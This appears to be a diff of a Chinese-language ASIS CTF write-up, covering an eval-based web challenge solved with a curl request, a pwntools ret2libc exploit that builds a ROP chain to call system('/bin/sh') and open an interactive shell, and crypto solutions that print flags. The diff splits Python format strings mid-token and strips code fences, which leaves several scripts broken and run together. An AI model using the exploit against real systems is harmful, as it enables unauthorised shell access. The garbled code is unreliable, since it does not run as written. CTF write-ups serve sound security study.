@@ -68,7 +68,8 @@ with open('/flag.txt') as f:
 if(__name__ == '__main__'):
     app.run(port=8000)
 
-只要让 eval 返回 /flag.txt 就可以了 最下面有一个打开 flag 文件的操作，同时存了文件描述符 f f 有一些方法那么 eval(“f.name”) 就可以返回 flag路径 curl http://ducks.asisctf.com:8000/duck?what=f.name
+只要让 eval 返回 /flag.txt 就可以了 最下面有一个打开 flag 文件的操作，同时存了文件描述符 f f 有一些方法那么 eval(“f.name”) 就可以返回 flag路径 curl http://ducks.asisctf.com:
+8000/duck?what=f.name
 
 Pwn
 
@@ -163,10 +164,12 @@ def chaffy_mask(salt, LTC, m, n):
     xor_salts = int.from_bytes(byte_xor(half1_salt, half2_salt), "big")
     if xor_salts == 0:
         half1_salt = byte_xor(half1_salt, os.urandom(m))
-    half1_binStr = "{:08b}".format(int(half1_salt.hex(), 16))
+    half1_binStr = "{:
+08b}".format(int(half1_salt.hex(), 16))
     if (len(half1_binStr) < m):
         half1_binStr = "0" * (m - len(half1_binStr) % m) + half1_binStr
-    half2_binStr = "{:08b}".format(int(half2_salt.hex(), 16))
+    half2_binStr = "{:
+08b}".format(int(half2_salt.hex(), 16))
     if (len(half2_binStr) < m):
         half2_binStr = "0" * (m - len(half2_binStr) % m) + half2_binStr
     vec_1 = np.array(list(half1_binStr), dtype=int)
@@ -288,11 +291,6 @@ with open('/flag.txt') as f:
 
 if(__name__ == '__main__'):
     app.run(port=8000)
-```
-
-
-
-```
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 from pwn import *
@@ -332,11 +330,6 @@ pd += p64(next(libc.search(b"/bin/sh")))
 pd += p64(libc.sym["system"])
 p.sendlineafter(b'data: ', pd)
 p.interactive()
-```
-
-
-
-```
 pubkey = 125004899806380680278294077957993138206121343727674199724251084023100054797391533591150992663742497532376954423241741439218367086541339504325939051995057848301514908377941815605487168789148131591458301036686411659334843972203243490288676763861925647147178902977362125434420265824374952540259396010995154324589
 enc = 789849126571263315208956108629196540107771075292285804732934458641661099043398300667318883764744131397353851782194467024270666326116745519739176492710750437625345677766980300328542459318943175684941281413218985938348407537978884988013947538034827562329111515306723274989323212194585378159386585826998838542734955059450048745917640814983343040930383529332576453845724747105810109832978045135562492851617884175410194781236450629682032219153517122695586503298477875749138129517477339813480115293124316913331705913455692462482942654717828006590051944205639923326375814299624264826939725890226430388059890231323791398412019416647826367964048142887158552454494856771139750458462334678907791079639005383932256589768726730285409763583606927779418528562990619985840033479201147509241313757191997545174262930707521451438204766627975109619779824255444258160
 import sympy
@@ -348,11 +341,6 @@ c=c*2
 c1=10054489678067822115481371335232343974958463063132871933014628812175566812121897618218465084557664288954026584252796
 print(long_to_bytes(c1+1))
 #ASIS{8!N0miaL_3XpAn5iOn_Us4G3_1N_cRyp7o_9rApHy!}
-```
-
-
-
-```
 import numpy as np
 import os, sys
 import binascii
@@ -372,10 +360,12 @@ def chaffy_mask(salt, LTC, m, n):
     xor_salts = int.from_bytes(byte_xor(half1_salt, half2_salt), "big")
     if xor_salts == 0:
         half1_salt = byte_xor(half1_salt, os.urandom(m))
-    half1_binStr = "{:08b}".format(int(half1_salt.hex(), 16))
+    half1_binStr = "{:
+08b}".format(int(half1_salt.hex(), 16))
     if (len(half1_binStr) < m):
         half1_binStr = "0" * (m - len(half1_binStr) % m) + half1_binStr
-    half2_binStr = "{:08b}".format(int(half2_salt.hex(), 16))
+    half2_binStr = "{:
+08b}".format(int(half2_salt.hex(), 16))
     if (len(half2_binStr) < m):
         half2_binStr = "0" * (m - len(half2_binStr) % m) + half2_binStr
     vec_1 = np.array(list(half1_binStr), dtype=int)
